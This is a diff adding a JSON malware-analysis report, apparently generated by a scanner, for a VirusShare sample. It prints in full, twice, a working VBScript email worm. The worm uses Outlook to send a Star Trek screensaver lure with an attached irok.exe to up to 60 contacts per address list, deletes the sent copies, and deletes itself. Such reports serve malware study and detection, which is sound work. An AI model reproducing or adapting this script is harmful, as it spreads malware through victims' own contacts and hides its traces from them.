@@ -1,0 +1,60 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "CreateObject": "May create an OLE object",
+            "System": "May run an executable file or a system command on a Mac",
+            "Windows": "May enumerate application windows"
+        },
+        "macro": "on error resume next\nSet IroKNow = CreateObject(\"outlook.application\")\nIf IroKNow <> \"\" Then\nSet Letsgo = IroKNow.GetNameSpace(\"MAPI\")\nFor damnit = 1 To Letsgo.AddressLists.Count\nSet ahshit = Letsgo.AddressLists(damnit)\nfuckina = 1\nSet fucku = IroKNow.CreateItem(0)\nFor argh = 1 To ahshit.AddressEntries.Count\nholyshitzor = ahshit.AddressEntries(fuckina)\nfucku.Recipients.Add holyshitzor\nfuckina = fuckina + 1\nIf fuckina > 60 Then Exit For\nNext\nfucku.Subject = \"I thought you might like to see this.\"\nfucku.Body = \"I thought you might like this. I got it from paramount pictures website. It's a startrek screen saver.\"\nfucku.Attachments.Add \"C:\\Windows\\System\\irok.exe\"\nfucku.DeleteAfterSubmit = True\nfucku.Send\nholyshitzor = \"\"\nNext\nEnd If\nSet Laterz = CreateObject(\"Scripting.FileSystemObject\")\nLaterz.DeleteFile Wscript.ScriptFullName"
+    },
+    "filename": "VirusShare_307604a9f24f3c52cf5e21dd29713dc8",
+    "filesize": 862,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "307604a9f24f3c52cf5e21dd29713dc8",
+        "sha1": "d9af41374aa92e68848f4d6440746d2a512285b5",
+        "sha256": "b1f78f746efba73620d39b58de0bae177ed7e9de04190c7b5479329a7403c6bb"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "on error resume next",
+            "Set IroKNow = CreateObject(\"outlook.application\")",
+            "If IroKNow <> \"\" Then",
+            "Set Letsgo = IroKNow.GetNameSpace(\"MAPI\")",
+            "For damnit = 1 To Letsgo.AddressLists.Count",
+            "Set ahshit = Letsgo.AddressLists(damnit)",
+            "fuckina = 1",
+            "Set fucku = IroKNow.CreateItem(0)",
+            "For argh = 1 To ahshit.AddressEntries.Count",
+            "holyshitzor = ahshit.AddressEntries(fuckina)",
+            "fucku.Recipients.Add holyshitzor",
+            "fuckina = fuckina + 1",
+            "If fuckina > 60 Then Exit For",
+            "Next",
+            "fucku.Subject = \"I thought you might like to see this.\"",
+            "fucku.Body = \"I thought you might like this. I got it from paramount pictures website. It's a startrek screen saver.\"",
+            "fucku.Attachments.Add \"C:\\Windows\\System\\irok.exe\"",
+            "fucku.DeleteAfterSubmit = True",
+            "fucku.Send",
+            "holyshitzor = \"\"",
+            "Next",
+            "End If",
+            "Set Laterz = CreateObject(\"Scripting.FileSystemObject\")",
+            "Laterz.DeleteFile Wscript.ScriptFullName"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.269511",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
